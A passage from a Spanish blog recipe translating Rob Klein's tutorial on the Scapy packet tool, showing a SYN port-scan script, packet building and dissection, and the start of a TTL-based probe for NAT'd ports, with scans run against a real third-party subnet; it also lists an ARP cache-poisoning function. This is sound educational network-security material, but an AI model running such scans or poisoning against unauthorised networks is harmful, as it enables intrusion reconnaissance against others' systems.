+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+      
+    
+  
+    
+      
+      	
+      	<li><a href="/publish.html">Publish</a></li>
+      	
+      
+    
+  
+    
+      
+      	
+      	<li><a href="/recipes.html">Recipes</a></li>
+      	
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+      	
+      	<li><a href="/users.html">Users</a></li>
+      	
+      
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+
+
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div class="container-narrow">
+
+      <div class="row-fluid">
+	<div class="content">
+          
+<div class="sidebar span3">
+  <div id="logo">
+  <a href="/">
+    <img src="/assets/images/logo.png" alt="logo"/>
+  </a>
+</div>
+
+  <div class="metadata">
+  <h2>this</h2>
+  <ul>
+    
+      <li>author: 
+  <a href="/users.html#david_villa">
+   david.villa
+  </a>
+
+
+        
+        <span class="author-photo">
+
+  <img src="http://www.gravatar.com/avatar/41aae9eabb1ef8e1cb8ab5619af82083?s=48" alt="gravatar"/>
+
+</span>
+
+      </li>
+      
+      <li>
+        <a href="https://twitter.com/david_vi11a" class="twitter-follow-button" data-show-count="false">Follow @david_vi11a</a>
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+      </li>
+      
+      
+      <li>
+        <span>
+
+Follow on <a title="Follow on G+" href="//plus.google.com/u/0/106836499723740718510?prsrc=3" rel="publisher" target="_top" style="text-decoration:none;">
+<img src="//ssl.gstatic.com/images/icons/gplus-16.png" alt="Google+" style="border:0;width:16px;height:16px;"/>
+</a>
+
+</span>
+
+      </li>
+      
+    
+
+    <li>created: 2007-01-28 </li>
+
+    <li><a href="https://github.com/CRySoL/web.source/raw/master/_posts/migrated/2007-01-28-magia-negra-con-scapy.textile">source</a> / <a href="https://github.com/CRySoL/web.source/edit/master/_posts/migrated/2007-01-28-magia-negra-con-scapy.textile">edit</a></li>
+
+  
+    <li>categories:
+    
+      <a href="/categories.html#recipe-ref">recipe</a>
+    
+    </li>
+  
+
+  
+      <li>migrated&nbsp;from&nbsp;<a href="http://crysol.org/node/540">node/540</a></li>
+  
+
+  
+    <li>tags:
+    
+      <a href="/tags.html#security-ref">security</a>
+    
+      <a href="/tags.html#scapy-ref">scapy</a>
+    
+      <a href="/tags.html#networking-ref">networking</a>
+    
+    </li>
+  
+  </ul>
+
+  
+     
+     
+  
+
+  
+     
+     
+     <a class="tag-icon" href="/tags.html#security-ref">
+        <img src="/assets/files/category_pictures/seguridad_taxonomy.png" title="security" alt="security-icon"/>
+     </a>
+     
+  
+     
+     
+  
+     
+     
+     <a class="tag-icon" href="/tags.html#networking-ref">
+        <img src="/assets/files/category_pictures/networking.png" title="networking" alt="networking-icon"/>
+     </a>
+     
+  
+
+  <!-- AddThis Button BEGIN -->
+<div class="share addthis_toolbox addthis_default_style addthis_16x16_style">
+<a class="addthis_button_google_plusone_share"></a>
+<a class="addthis_button_twitter"></a>
+<a class="addthis_button_facebook"></a>
+<a class="addthis_button_compact"></a><a class="addthis_counter addthis_bubble_style"></a>
+</div>
+<script type="text/javascript">var addthis_config = {"data_track_addressbar":true};</script>
+<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-51cdd0d57c014017"></script>
+<!-- AddThis Button END -->
+
+</div>
+
+<div class="related">
+  <h2>related</h2>
+
+  <ul>
+   
+   
+      
+        
+          
+          <li><a href="/recipe/2018-09-11/hg-useful-commands.html">Mercurial useful commands</a></li>
+        
+      
+        
+          
+          <li><a href="/recipe/2018-03-09/firma-digital-firefox.html">Autofirma con firefox y DNIe</a></li>
+        
+      
+        
+          
+          <li><a href="/recipe/2011-02-01/cambiar-contrasea-en-particin-cifrada.html">Cambiar contraseña en partición cifrada</a></li>
+        
+      
+        
+          
+          <li><a href="/recipe/2010-11-04/control-de-acceso-con-pam.html">Control de acceso con PAM</a></li>
+        
+      
+        
+          
+          <li><a href="/2010-06-16/problemon-en-el-pc.html">problemon en el pc</a></li>
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+   
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+   
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+   
+  </ul>
+
+  
+</div>
+
+<div class="recent">
+  <h2>recent</h2>
+  <ul>
+  
+    <li><a href="/recipe/2018-09-11/hg-useful-commands.html">Mercurial useful commands</a></li>
+  
+    <li><a href="/recipe/2018-03-09/firma-digital-firefox.html">Autofirma con firefox y DNIe</a></li>
+  
+    <li><a href="/recipe/2017-12-20/using-ian-for-package-build.html">Construir paquetes debian con ian</a></li>
+  
+    <li><a href="/recipe/2017-05-19/essential-git-branching.html">Essential git branching</a></li>
+  
+    <li><a href="/recipe/2017-02-15/ultra-simple-tmux-recipe.html">Ultra simple tmux recipe</a></li>
+  
+  </ul>
+</div>
+
+</div>
+
+<div class="node span9">
+  <div class="page-header">
+    <h1>Magia negra con scapy </h1>
+  </div>
+
+  <div class="row-fluid post-full">
+    <div class="span12">
+      <div class="content">
+	<p>Esta receta en realidad es una traducción de un artículo de Rob Klein titulado <a href="http://hackaholic.org/papers/blackmagic.txt">Packet Wizardry: Ruling the Network with Python</a> usando la magnífica herramienta <a href="http://www.secdev.org/projects/scapy/">scapy</a>. Igual es un poco largo para receta, pero bueno, no tiene desperdicio.</p>
+<p><!--break--></p>
+<h3>Autor</h3>
+<p>By Rob klein Gunnewiek aka detach <a href="http://hackaholic.org/">http://hackaholic.org/</a></p>
+<h3>Historial de cambios</h3>
+<ul>
+	<li>v2005-08-09 (This paper is subject to change.. new techniques will probably be added over time)</li>
+	<li>Changes:
+	<ul>
+		<li>v2005-08-09: Some fixes</li>
+		<li>v2005-04-05: Typo&#8217;s and errata</li>
+		<li>v2005-03-28: Initial paper</li>
+	</ul></li>
+</ul>
+<h2>Prefacio</h2>
+<p>En este tutorial cubriré técnicas que involucran la construcción y manipulación de paquetes para &#8216;controlar&#8217; la red desde la línea de comandos de Python. No se requieren conocimientos previos de Python, sin embargo supongo que cuando estés tan emocionado con el tema como lo estoy yo, querrás aprender inmediatamente. Sin embargo, si que recomiendo cierto conocimiento previo sobre problemas comunes de seguridad de redes.</p>
+<p>Este tutorial es una zambullida práctica sobre seguridad en redes. La escasez de información práctica sobre la seguridad al nivel de red me lleva a creer que muchos curiosos tienen pocos conocimientos sobre el asunto. Puede que conozcas las bases de <span class="caps">TCP</span>/IP y sepas cómo usar Nmap. Puede que sepas incluso algunos trucos como el &#8216;escaneo suspendido&#8217; usando Hping2. Pero ¿qué has programado usando Libnet? ¿Nunca has programado un sniffer básico usando Libpcap?</p>
+<p>En cualquier caso, a pesar de tus conocimientos en el área del reconocimiento y los ataques de red, esta guía podría ser muy interesante</p>
+<h2>Introducción</h2>
+<p>Para que puedas decidir si deberías leer este tutorial, empezaré dando un ejemplo rápido para demostrar la potencia con la que estamos tratando aquí:</p>
+<p>Quiero programar un escaneador de puertos, para escanear una red clase C completa para enumerar todos los hosts que tienen abierto el puerto 80. Ejecuto la shell de Python y empiezo a escribir comandos:</p>
+<pre class="console">
+  &gt;&gt;&gt; p=IP(dst="hackaholic.org/24")/TCP(dport=80, flags="S")
+  &gt;&gt;&gt; sr(p)
+</pre>
+<p>¡Eso es todo! Ahora vemos qué hosts están escuchando en el puerto 80:</p>
+<pre class="console">
+  &gt;&gt;&gt; results = _[0]
+  &gt;&gt;&gt; for pout, pin in results:
+  ...     if pin.flags == 2:
+  ...         print pout.dst
+  ...
+  24.132.156.5
+  24.132.156.19
+  24.132.156.24
+  24.132.156.72
+  24.132.156.102
+  24.132.156.107
+  24.132.156.121
+  24.132.156.141
+  24.132.156.150
+  24.132.156.148
+  24.132.156.204
+  24.132.156.211
+  &gt;&gt;&gt;
+</pre>
+<p>¡Bienvenido a esta caja de magia negra llamada Scapy! Qué hemos hecho. Primero cree un paquete que fue enviado a la subred /24 a la que está conectada hackaholic.org y puse el puerto destino 80 y el flag <span class="caps">SYN</span> en la cabecera <span class="caps">TCP</span>.</p>
+<p>Después, como sabes, el frag <span class="caps">SYN</span> se utiliza para iniciar una conexión. Una respuesta SA (<span class="caps">SYN</span>/<span class="caps">ACK</span>) significa que el puerto está a la escucha, un RA (<span class="caps">RESET</span>/<span class="caps">ACK</span>) significa que está cerrado, y finalmente la ausencia de respuesta significa que el host está apagado o un firewall está descartando los paquetes.</p>
+<p>Después de construir el paquete, le pido a Scapy que libere su magia negra y emita los paquetes. Los resultados se diseccionan en el bucle for y se lista la dirección IP destino de los hosts que respondieron SA</p>
+<p>Scapy es una herramienta excelente escrita por Philippe Biondi. Aunque este tutorial debería facilitar la mayoría de la documentación que podrías necesitar, puedes encontrar más documentación ahí. Asegúrate de estudiar también su presentación sobre Scapy. Aunque scapy en si es bueno, su documentación no es fabulosa, mucho lo tendrás que aprender por ti mismo.</p>
+<h2>Puesta en marcha de Scapy</h2>
+<p>Bien, espero que el ejemplo de la introducción haya captado tu atención y te motive a través de esta sección en la que voy a explicar detalles aburridos sobre programación Python/Scapy</p>
+<p>Primero, déjame decirte que yo no soy un experto en Python. Soy un tío práctico, no me gusta aprender cosas que no son prácticas desde el principio. Mi aprendizaje de Python es el resultado de mi intención de usar Scapy de forma efectiva. No tengo un libro de texto y puede que algunas cosas seas desconocidas para mi o estén equivocadas.</p>
+<p>BIen, primero la configuración del entorno de Scapy. Instala la distribución binaria de Python de tu distribución <span class="caps">GNU</span>/Linux He visto que deberías tener al menos Python-2.2 o superior para que Scapy funcione. Escribe &#8216;python&#8217; en un terminal y comprueba si funciona:</p>
+<pre class="console">
+  detach@luna:~$ python
+  Python 2.3.5c1 (#2, Jan 27 2005, 10:49:01)
+  [GCC 3.3.5 (Debian 1:3.3.5-6)] on linux2
+  Type "help", "copyright", "credits" or "license" for more information.
+  &gt;&gt;&gt; if 1+1 == 2:
+  ...     print "Thank goodness!"
+  ...
+  Thank goodness!
+  &gt;&gt;&gt;
+</pre>
+<p>Lo que más me gusta de Python es que puedes escribir cualquier cosa que tú crees que debería funcionar y funciona. Hay algunas reglas básicas en Python que deberías saber:</p>
+<ol>
+	<li>Los bloques no van dentro de llaves, o sentencias <span class="caps">BEGIN</span>-<span class="caps">END</span>, se distinguen por la indentación apropiada; 4 espacios y líneas vacías.</li>
+	<li>No se necesita punto-y-coma como separador de sentencias (pero se puede usar si quieres poner varias sentencias en la misma línea)</li>
+	<li>No se necesitan paréntesis en las sentencias condicionales como IF o <span class="caps">WHILE</span>, las sentencias condicionales acaban con &#8216;:&#8217; después de poner la expresión.</li>
+</ol>
+<p>La característica de Python más importante y probablemente más chula es que tiene un modo interactivo nativo. Sí, ese es el modo que acabas de usar. Tú ejecutas &#8216;python&#8217; y tiene el indicador &#8216;&gt;&gt;&gt;&#8217;.</p>
+<p>Ahora que tenemos Python funcionando vamos con scapy. Descarga scapy de &#8220;&#8221;http://www.secdev.org/projects/scapy/&#8220;:http://www.secdev.org/projects/scapy/&#8221;&gt;http://www.secdev.org/projects/scapy/&quot;:http://www.secdev.org/projects/scapy/</a>, en el momento de escribir esto, la versión es 0.9.17beta. Extrae el fuente de Scapy y ejecuta el programa como root<sup class="footnote" id="fnr2"><a href="#fn2">2</a></sup>.</p>
+<pre class="console">
+  detach@luna:~/lab/scapy-0.9.17$ sudo python ./scapy.py
+  Welcome to Scapy (0.9.17.1beta)
+  &gt;&gt;&gt;
+</pre>
+<p>Pudes dejar que scapy guarde todo lo que escribas indicandole un nombre de fichero en la linea de comandos.</p>
+<h2>Scapy en una cáscara de nuez</h2>
+<p>Empezaré con una lista de lo que creo que son las ventajas más significativas de Scapy.</p>
+<ul>
+	<li>Scapy tiene modos &#8216;envío&#8217;, &#8216;recepción&#8217; y &#8216;envío&amp;recepción&#8217;</li>
+	<li>Scapy puede enviar paquetes en la capa 2 (enlace de datos) y en la capa 3 (red)</li>
+	<li>Scapy tiene varias funciones de alto nivel como <code>p0f()</code> y <code>arpcachepoison</code> que pueden hacer lo mismo que la mayoría de las aplicaciones de seguridad.</li>
+	<li>Es fácil diseccionar y reutilizar las respuestas.</li>
+	<li>Es fácil</li>
+	<li>Lo malo de Scapy es que es relativamente lento, lo que puede hacer imposible algunos usos. Por eso es más adecuado para reconocimiento, y no para un DoS por ejemplo.</li>
+</ul>
+<p>Los comandos/funciones más importantes de scapy, los que necesitas recordar son <code>ls()</code> y <code>lsc()</code>. Los usarás mucho.</p>
+<pre class="console">
+  &gt;&gt;&gt; ls()
+  Dot11Elt   : 802.11 Information Element
+  Dot11      : 802.11
+  SNAP       : SNAP
+  IPerror    : IP in ICMP
+  BOOTP      : BOOTP
+  PrismHeader : abstract packet
+  Ether      : Ethernet
+  TCP        : TCP
+  Dot11ProbeResp : 802.11 Probe Response
+  TCPerror   : TCP in ICMP
+  Dot11AssoResp : 802.11 Association Response
+  Dot11ReassoReq : 802.11 Reassociation Request
+  Packet     : abstract packet
+  UDPerror   : UDP in ICMP
+  ISAKMP     : ISAKMP
+  Dot11ProbeReq : 802.11 Probe Request
+  NTP        : NTP
+  Dot11Beacon : 802.11 Beacon
+  DNSRR      : DNS Resource Record
+  STP        : Spanning Tree Protocol
+  ARP        : ARP
+  UDP        : UDP
+  Dot11ReassoResp : 802.11 Reassociation Response
+  Dot1Q      : 802.1Q
+  ICMPerror  : ICMP in ICMP
+  Raw        : Raw
+  IKETransform : IKE Transform
+  IKE_SA     : IKE SA
+  ISAKMP_payload : ISAKMP payload
+  LLPPP      : PPP Link Layer
+  IP         : IP
+  LLC        : LLC
+  Dot11Deauth : 802.11 Deauthentication
+  Dot11AssoReq : 802.11 Association Request
+  ICMP       : ICMP
+  Dot3       : 802.3
+  EAPOL      : EAPOL
+  Dot11Disas : 802.11 Disassociation
+  Padding    : Padding
+  DNS        : DNS
+  Dot11Auth  : 802.11 Authentication
+  Dot11ATIM  : 802.11 ATIM
+  DNSQR      : DNS Question Record
+  EAP        : EAP
+  IKE_proposal : IKE proposal
+  &gt;&gt;&gt;
+</pre>
+<p>Después explicaré cómo usar esta información</p>
+<p>La función <code>lsc()</code> lista todas las funciones disponibles (de Scapy):</p>
+<pre class="console">
+  &gt;&gt;&gt; lsc()
+  sr               : Send and receive packets at layer 3
+  sr1              : Send packets at layer 3 and return only the first answer
+  srp              : Send and receive packets at layer 2
+  srp1             : Send and receive packets at layer 2 and return only the
+                     first answer
+  srloop           : Send a packet at layer 3 in loop and print the answer
+                     each time
+  srploop          : Send a packet at layer 2 in loop and print the answer
+                     each time
+  sniff            : Sniff packets
+  p0f              : Passive OS fingerprinting: which OS emitted this TCP SYN
+  arpcachepoison   : Poison target's cache with (your MAC,victim's IP) couple
+  send             : Send packets at layer 3
+  sendp            : Send packets at layer 2
+  traceroute       : Instant TCP traceroute
+  arping           : Send ARP who-has requests to determine which hosts are
+                     up
+  ls               : List  available layers, or infos on a given layer
+  lsc              : List user commands
+  queso            : Queso OS fingerprinting
+  nmap_fp          : nmap fingerprinting
+  report_ports     : portscan a target and output a LaTeX table
+  dyndns_add       : Send a DNS add message to a nameserver for "name" to
+                     have a new "rdata"
+  dyndns_del       : Send a DNS delete message to a nameserver for "name"
+  &gt;&gt;&gt;
+</pre>
+<p>Otras funciones genéricas importantes:</p>
+<ul>
+	<li>Net()</li>
+	<li><acronym title="), ICMP("><span class="caps">IP</span></acronym>, <acronym title="), Ether("><span class="caps">TCP</span></acronym>, etc.</li>
+</ul>
+<p>Estas funciones <code>IP()</code>, <code>ICMP()</code>, etc son muy interesantes<sup class="footnote" id="fnr3"><a href="#fn3">3</a></sup>. Puedes verlas usando el comando <code>ls()</code> y puedes usarlas para construir encabezados. Por ejemplo:</p>
+<pre class="console">
+  &gt;&gt;&gt; ip = IP()
+  &gt;&gt;&gt; icmp = ICMP()
+  &gt;&gt;&gt; ip
+  &lt;IP |&gt;
+  &gt;&gt;&gt; icmp
+  &lt;ICMP |&gt;
+  &gt;&gt;&gt; ip.dst = "192.168.9.1"
+  &gt;&gt;&gt; icmp.display()
+  ---[ ICMP ]---
+  type      = echo-request
+  code      = 0
+  chksum    = 0x0
+  id        = 0x0
+  seq       = 0x0
+  &gt;&gt;&gt; sr1(ip/icmp)
+  Begin emission:
+  ...*Finished to send 1 packets.
+
+  Received 4 packets, got 1 answers, remaining 0 packets
+  &lt;IP version=4L ihl=5L tos=0x0 len=28 id=16713 flags= frag=0L ttl=64
+  proto=ICMP chksum=0xa635 src=192.168.9.1 dst=192.168.9.17 options='' |&lt;ICMP
+  type=echo-reply code=0 chksum=0xffff id=0x0 seq=0x0 |&lt;Padding
+  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|)\x0c\xa4'
+  |&gt;&gt;&gt;
+  &gt;&gt;&gt; _.display()
+  ---[ IP ]---
+  version   = 4L
+  ihl       = 5L
+  tos       = 0x0
+  len       = 28
+  id        = 16713
+  flags     =
+  frag      = 0L
+  ttl       = 64
+  proto     = ICMP
+  chksum    = 0xa635
+  src       = 192.168.9.1
+  dst       = 192.168.9.17
+  options   = ''
+  ---[ ICMP ]---
+     type      = echo-reply
+     code      = 0
+     chksum    = 0xffff
+     id        = 0x0
+     seq       = 0x0
+  ---[ Padding ]---
+        load      =
+  '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|)\x0c\xa4'
+  &gt;&gt;&gt;
+</pre>
+<p>Un paquete se puede crear de muchas formas. La más corta es algo como:</p>
+<pre class="console">
+  &gt;&gt;&gt; p = IP(dst="192.168.9.1")/ICMP()
+  &gt;&gt;&gt; sr1(p)
+  Begin emission:
+  ...*Finished to send 1 packets.
+
+  Received 4 packets, got 1 answers, remaining 0 packets
+  &lt;IP version=4L ihl=5L tos=0x0 len=28 id=16714 flags= frag=0L ttl=64
+  proto=ICMP chksum=0xa634 src=192.168.9.1 dst=192.168.9.17 options='' |&lt;ICMP
+  type=echo-reply code=0 chksum=0xffff id=0x0 seq=0x0 |&lt;Padding
+  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x16\x89\xdb\x88'
+  |&gt;&gt;&gt;
+  &gt;&gt;&gt;
+</pre>
+<p>Para encontrar qué campos puede tener cada protocolo, usa <code>ls()</code> con un argumento:</p>
+<pre class="console">
+  &gt;&gt;&gt; ls(TCP)
+  sport      : ShortField           = (20)
+  dport      : ShortField           = (80)
+  seq        : IntField             = (0)
+  ack        : IntField             = (0)
+  dataofs    : BitField             = (None)
+  reserved   : BitField             = (0)
+  flags      : FlagsField           = (2)
+  window     : ShortField           = (0)
+  chksum     : XShortField          = (None)
+  urgptr     : ShortField           = (0)
+  options    : TCPOptionsField      = ({})
+  &gt;&gt;&gt;
+</pre>
+<p>Así puedes asignar cualquiera de estos campos, también puedes ver cuales son sus valores por defecto. Por ejemplo, el puerto origen por defecto es 20, el puesto destino es 80.</p>
+<p>Cuando se imprime un paquete solo se muestran los campos modficados. Como éste:</p>
+<pre class="console">
+  &gt;&gt;&gt; i = IP()
+  &gt;&gt;&gt; i
+  &lt;IP |&gt;
+  &gt;&gt;&gt; i.dst = "192.168.9.1"
+  &gt;&gt;&gt; i
+  &lt;IP dst=192.168.9.1 |&gt;
+  &gt;&gt;&gt; i.src = "192.168.9.2"
+  &gt;&gt;&gt; del(i.dst)
+  &gt;&gt;&gt; i
+  &lt;IP src=192.168.9.2 |&gt;
+  &gt;&gt;&gt;
+</pre>
+<p>Por supuesto, para mostrar todos los campos usa el método <code>i.display()</code>. Me gusta mucho esto, puedes ver fácilmente lo que has modificado, no tienes que tratar con campos que no te interesan. Por ejemplo, yo no quiero ver qué opciones <span class="caps">TCP</span> están habilitadas, porque yo no uso opciones <span class="caps">TCP</span> en la mayoría de los ataques. Si las uso, entonces se muestran. Excelente.</p>
+<p>También puedes usar <code>ls()</code> para mostrar un paquete existente:</p>
+<pre class="console">
+  &gt;&gt;&gt; ls(i)
+  version    : BitField             = 4               (4)
+  ihl        : BitField             = None            (None)
+  tos        : XByteField           = 0               (0)
+  len        : ShortField           = None            (None)
+  id         : ShortField           = 1               (1)
+  flags      : FlagsField           = 0               (0)
+  frag       : BitField             = 0               (0)
+  ttl        : ByteField            = 64              (64)
+  proto      : ByteEnumField        = 0               (0)
+  chksum     : XShortField          = None            (None)
+  src        : SourceIPField        = '192.168.9.2'   (None)
+  dst        : IPField              = '127.0.0.1'     ('127.0.0.1')
+  options    : IPoptionsField       = ''              ('')
+  &gt;&gt;&gt;
+</pre>
+<p>Se muestra el valor por defecto, y el valor actual. Cuando construyes un paquete también puedes añadir una carga, como éste:</p>
+<pre class="console">
+  &gt;&gt;&gt; p = IP(dst="192.168.9.1")/TCP(dport=22)/"AAAAAAAAAA"
+  &gt;&gt;&gt; p
+  &lt;IP proto=TCP dst=192.168.9.1 |&lt;TCP dport=22 |&lt;Raw load='AAAAAAAAAA' |&gt;&gt;&gt;
+  &gt;&gt;&gt;
+</pre>
+<p>Para enviar paquetes en la capa 2, tienes que usar las funciones <code>sendp</code>, <code>srp</code>, <code>srploop</code> y <code>srp1</code>. La &#8216;p&#8217; significa PF_PACKET, que es la interfaz de Linux que permite enviar paquetes en la capa 2.</p>
+<p>Los paquetes están formados por cabeceras y el tipo de datos del paquete es una lista. Puedes comprobarlo usando la función <code>type()</code> de Python.</p>
+<p>Para ver el paquete crudo como una cadena puede ser útil entender la disección:</p>
+<pre class="console">
+  &gt;&gt;&gt; packet = IP(dst="192.168.0.1")/TCP(dport=25)
+  &gt;&gt;&gt; raw_packet = str(packet)
+  &gt;&gt;&gt; type(raw_packet)
+  &lt;type 'str'&gt;
+  &gt;&gt;&gt; IP(raw_packet)
+  &lt;IP version=4L ihl=5L tos=0x0 len=40 id=1 flags= frag=0L ttl=64 proto=TCP
+  chksum=0xf36c src=192.168.6.17 dst=192.168.0.1 options='' |&lt;TCP sport=20
+  dport=25 seq=0L ack=0L dataofs=5L reserved=16L flags=S window=0
+  chksum=0x2853 urgptr=0 |&gt;&gt;
+  &gt;&gt;&gt; TCP(raw_packet)
+  &lt;TCP sport=17664 dport=40 seq=65536L ack=1074197356L dataofs=12L
+  reserved=0L flags=PUC window=1553 chksum=0xc0a8 urgptr=1 options=[] |&gt;
+  &gt;&gt;&gt; dissected_tcp = TCP(raw_packet)
+  &gt;&gt;&gt; dissected_tcp
+  &lt;TCP sport=17664 dport=40 seq=65536L ack=1074197356L dataofs=12L
+  reserved=0L flags=PUC window=1553 chksum=0xc0a8 urgptr=1 options=[] |&gt;
+  &gt;&gt;&gt; raw_packet
+  'E\x00\x00(\x00\x01\x00\x00@\x06\xf3l\xc0\xa8\x06\x11\xc0\xa8\x00\x01\x00\x14\x00\x19\x00\x00\x00\x00\x00\x00\x00\x00P\x02\x00\x00(S\x00\x00'
+  &gt;&gt;&gt;
+</pre>
+<h2>Construye tus propias herramientas con Scapy</h2>
+<p>Esta es la técnica de escaneo de puertos, que aquí aparece como un script, no interactivo:</p>
+<pre class="console">
+  detach@luna:~/lab/scapy-0.9.17$ cat pscan.py
+  #!/usr/bin/env python
+
+  import sys
+  from scapy import *
+  conf.verb=0
+
+  if len(sys.argv) != 2:
+      print "Usage: ./pscan.py &lt;target&gt;"
+      sys.exit(1)
+
+  target=sys.argv[1]
+
+  p=IP(dst=target)/TCP(dport=80, flags="S")
+  ans,unans=sr(p, timeout=9)
+
+  for a in ans:
+      if a[1].flags == 2:
+          print a[1].src
+</pre>
+<p>Vamos a probarla:</p>
+<pre class="console">
+  detach@luna:~/lab/scapy-0.9.17$ sudo ./pscan.py 192.168.9.0/24
+  192.168.9.1
+  192.168.9.2
+  192.168.9.11
+  192.168.9.14
+</pre>
+<p>¿Ves lo potente que es esto? A continuación construiré un programa tipo traceroute/firewalk que he tratado en <a href="http://hackaholic.org/papers/firewalls.txt">Dealing with Firewalls</a>. Lo que hacemos es jugar con el <acronym title="Time To Live"><span class="caps">TTL</span></acronym> y un puerto específico. De esta forma podemos ver si se usa <span class="caps">NAT</span> para los puertos redirigidos.</p>
+<p>Lo que tenemos que hacer es:</p>
+<ul>
+	<li>Detectar el <span class="caps">TTL</span> mínimo para alcanzar nuestro objetivo</li>
+	<li>Encontrar un puerto para probar en nuestro host objetivo</li>
+	<li>Descubrir si en ese puerto está escuchando el host objetivo o está NATeado.</li>
+</ul>
+<p>Para esto necesitamos <code>sr1()</code> ya que queremos enviar paquetes en un bucle hasta que tengamos una respuesta distinta de error <span class="caps">ICMP</span>. También necesitamos tener en cuenta el <span class="caps">TTL</span> actual. Entonces, ese <span class="caps">TTL</span> mínimo para alcanzar el host se consigue enviando un <span class="caps">TCP</span> <span class="caps">SYN</span> para un puerto específico. Si lo que conseguimos es un <span class="caps">SYN</span>/<span class="caps">ACK</span> (o quizá <span class="caps">RST</span>/<span class="caps">ACK</span>) asumimos que este puerto no está NATeado, de lo contrario sí lo está.</p>
+<p>Bien, hagamos el programa para encontrar el <span class="caps">TTL</span> para alcanzar a nuestro objetivo:</p>
+<pre class="console">
+  $ sudo python ./scapy.py
+  Welcome to Scapy (0.9.17.1beta)
+  &gt;&gt;&gt; ttl = 0
+  &gt;&gt;&gt; def mkpacket():
+  ...     global ttl
+  ...     ttl = ttl + 1
+  ...     p = IP(dst="hackaholic.org", ttl=ttl)/ICMP()
+  ...     return p
+  ...
+  &gt;&gt;&gt; res = sr1(mkpacket())
+  Begin emission:
+  ...*Finished to send 1 packets.
+
+  Received 4 packets, got 1 answers, remaining 0 packets
+  &gt;&gt;&gt; while res.type == 11:
+  ...     res = sr1(mkpacket())
+  ...
+  Begin emission:
+  .Finished to send 1 packets.
+  *
+  Received 2 packets, got 1 answers, remaining 0 packets
+  Begin emission:
+  .Finished to send 1 packets.
+  *
+  Received 2 packets, got 1 answers, remaining 0 packets
+  Begin emission:
+  .Finished to send 1 packets.
+  *
+  ****** Etcetera,
+  &gt;&gt;&gt; ttl
+  15
+  &gt;&gt;&gt;
+</pre>
+<p>Esto significa que en el salto 15 hemos llegado al host, o que el <span class="caps">TTL</span> mínimo para llegar al host es 15. Fíjate en que el constructor de <code>ICMP()</code> no requiere ningún parámetro porque por defecto es un icmp-echo-request. Si <span class="caps">ICMP</span> está bloqueado (algo que ocurre mucho hoy en día), puedes intentar con <span class="caps">UDP</span> o <span class="caps">TCP</span>. Pero recuerda que queremos averiguar la configuración del <span class="caps">NAT</span>, is usas <span class="caps">TCP</span> entonces utiliza un puerto cerrado. De otro modo, ¿cómo sabes si ese puerto está NATeado? (Nota: incluso los puertos cerrados puede estar NATeados).</p>
+<p>Ahora que sabemos que la distancia es 15 podemos ver qué puertos están NATeados simplemente usando la misma técnica y viendo si hay diferencia en los TTLs que necesitamos.</p>
